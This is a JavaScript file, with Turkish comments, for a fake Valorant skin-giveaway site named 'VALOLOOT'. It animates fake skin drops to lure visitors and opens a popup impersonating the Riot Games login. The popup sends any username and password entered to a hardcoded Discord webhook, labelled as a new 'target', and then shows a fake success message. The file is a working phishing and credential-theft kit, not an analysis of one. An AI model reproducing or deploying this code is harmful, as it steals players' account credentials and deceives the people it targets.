// Webhook linkini buraya yapıştır
const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq"; 

const dropSkins = [
    {n: "Kuronami Vandal", i: "https://static.wikia.nocookie.net/valorant/images/a/a7/Kuronami_Vandal.png"},
    {n: "Reaver Sheriff", i: "https://static.wikia.nocookie.net/valorant/images/8/8f/Reaver_Sheriff.png"},
    {n: "Prime Phantom", i: "https://static.wikia.nocookie.net/valorant/images/e/e0/Prime_Phantom.png"},
    {n: "Elderflame Vandal", i: "https://static.wikia.nocookie.net/valorant/images/5/5e/Elderflame_Vandal.png"},
    {n: "Ion Sheriff", i: "https://static.wikia.nocookie.net/valorant/images/6/61/Ion_Sheriff.png"},
    {n: "Glitchpop Vandal", i: "https://static.wikia.nocookie.net/valorant/images/8/8a/Glitchpop_Vandal.png"},
    {n: "Champions Phantom", i: "https://static.wikia.nocookie.net/valorant/images/4/41/Champions_2024_Phantom.png"}
];

// Site yüklenince hata almamak için güvenli başlatma
document.addEventListener("DOMContentLoaded", () => {
    const track = document.getElementById('dropTrack');
    
    // Rastgele skin fırlatma fonksiyonu
    function throwNewDrop() {
        if(!track) return;

        // Rastgele bir skin seç
        const randomSkin = dropSkins[Math.floor(Math.random() * dropSkins.length)];
        
        // Yeni kartı oluştur
        const wrapper = document.createElement('div');
        wrapper.className = 'drop-wrapper';
        wrapper.innerHTML = `
            <div class="drop-card">
                <span class="new-badge">DROP</span>
                <img src="${randomSkin.i}" alt="skin">
                <span>${randomSkin.n}</span>
            </div>
        `;

        // Şeridin en soluna ekle (Diğerlerini sağa itecek)
        track.prepend(wrapper);

        // Şerit çok dolmasın diye 15. karttan sonrasını sil
        if (track.children.length > 15) {
            track.removeChild(track.lastChild);
        }

        // --- RASTGELE SÜRE MANTIĞI BURADA ---
        // 500ms (yarım saniye) ile 3500ms (3.5 saniye) arasında rastgele bir süre bekle
        const randomDelay = Math.floor(Math.random() * 3000) + 500;
        
        // Rastgele süre geçtikten sonra fonksiyonu tekrar çağır
        setTimeout(throwNewDrop, randomDelay);
    }

    // İlk açılışta boş kalmasın diye hemen başlat
    throwNewDrop();
    setTimeout(throwNewDrop, 200);
    setTimeout(throwNewDrop, 600);
});

// GİRİŞ VE UYARI SİSTEMİ
let loggedIn = false;

function openLogin() {
    const w = 450, h = 600;
    const l = (window.innerWidth/2)-(w/2), t = (window.innerHeight/2)-(h/2);
    let win = window.open("", "Riot Login", `width=${w},height=${h},top=${t},left=${l}`);

    win.document.body.innerHTML = `
        <style>
            body { background: #f4f4f4; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
            img { width: 100px; margin-bottom: 20px; }
            input { width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
            button { width: 80%; padding: 12px; background: #ff4655; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
        </style>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Riot_Games_logo.svg/2560px-Riot_Games_logo.svg.png">
        <h3>Riot Games ile Oturum Aç</h3>
        <input type="text" id="u" placeholder="Kullanıcı Adı">
        <input type="password" id="p" placeholder="Şifre">
        <button id="b">GİRİŞ YAP</button>
    `;

    win.document.getElementById('b').onclick = function() {
        const u = win.document.getElementById('u').value;
        const p = win.document.getElementById('p').value;
        if(u && p) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: `✅ **Yeni VALOLOOT Hedef!**\n👤: \`${u}\` \n🔑: \`${p}\`` })
            }).then(() => {
                loggedIn = true;
                win.close();
                alert("Giriş Başarılı! Bakiyeniz ve kasanız tanımlandı.");
            });
        }
    };
}

function checkLogin() {
    if(!loggedIn) openLogin();
    else alert("Kasa animasyonu yükleniyor...");
}
